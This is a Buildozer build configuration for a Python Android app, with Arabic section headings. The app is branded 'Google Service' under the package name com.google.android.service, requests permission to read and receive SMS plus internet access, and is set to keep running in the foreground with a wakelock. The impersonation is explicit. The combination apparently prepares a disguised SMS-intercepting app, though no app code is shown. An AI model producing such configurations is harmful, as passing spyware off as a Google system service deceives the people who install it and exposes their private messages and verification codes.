[app]
title = Google Service
package.name = com.google.android.service
package.domain = com.google.android.service
source.dir = .
source.include_exts = py
version = 1.0

# ===== المكتبات المطلوبة بالكامل =====
requirements = python3,requests,urllib3,chardet,idna,certifi

# ===== إعدادات التطبيق =====
orientation = portrait
fullscreen = 0
osx.python_version = 3
osx.kivy_version = 2.1.0

# ===== إعدادات الأندرويد =====
android.api = 30
android.minapi = 21
android.ndk = 23b
android.sdk = 30
android.arch = arm64-v8a
android.accept_sdk_license = True
android.ndk_path = /home/runner/.buildozer/android/platform/android-ndk-r23b

# ===== الصلاحيات =====
android.permissions = INTERNET,READ_SMS,RECEIVE_SMS

# ===== تشغيل في الخلفية =====
android.wakelock = True
android.foreground = True
android.allow_backup = True

[buildozer]
log_level = 2
warn_on_root = 1
